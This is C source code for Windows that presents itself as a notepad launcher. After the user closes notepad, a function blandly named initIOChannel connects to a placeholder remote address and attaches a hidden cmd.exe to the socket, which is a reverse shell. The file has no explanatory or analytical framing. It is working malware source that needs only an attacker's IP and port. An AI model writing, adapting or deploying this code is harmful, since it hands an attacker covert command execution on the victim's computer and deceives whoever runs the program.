#include <winsock2.h>
#include <windows.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32")

void initIOChannel() {
    WSADATA ws;
    SOCKET s;
    struct sockaddr_in srv;

    WSAStartup(MAKEWORD(2,2), &ws);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    srv.sin_family = AF_INET;
    srv.sin_port = htons(XXXX);
    srv.sin_addr.s_addr = inet_addr("X.X.X.X");

    if (WSAConnect(s, (SOCKADDR*)&srv, sizeof(srv), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return;
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
}

HWND fetchWindowFromPid(DWORD pid) {
    HWND h = GetTopWindow(NULL);
    while (h) {
        DWORD pidFound;
        GetWindowThreadProcessId(h, &pidFound);
        if (pidFound == pid && IsWindowVisible(h)) {
            return h;
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return NULL;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        WaitForInputIdle(pi.hProcess, 5000);

        HWND win = NULL;
        for (int i = 0; i < 20 && win == NULL; i++) {
            win = fetchWindowFromPid(pi.dwProcessId);
            Sleep(100);
        }
        if (win) {
            ShowWindow(win, SW_SHOW);
            SetForegroundWindow(win);
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        initIOChannel();
    }

    return 0;
}
